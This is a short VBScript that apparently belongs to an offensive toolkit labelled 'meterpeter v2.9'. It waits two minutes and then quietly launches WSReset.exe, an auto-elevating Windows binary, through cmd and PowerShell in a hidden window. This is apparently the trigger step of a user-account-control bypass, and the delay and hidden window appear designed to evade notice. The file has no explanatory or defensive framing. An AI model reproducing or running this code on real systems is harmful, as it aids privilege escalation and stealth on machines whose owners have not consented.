' Framework: meterpeter v2.9
Set objShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 120000 'Sleeps for 120 seconds
objShell.Run "cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden", 0, True
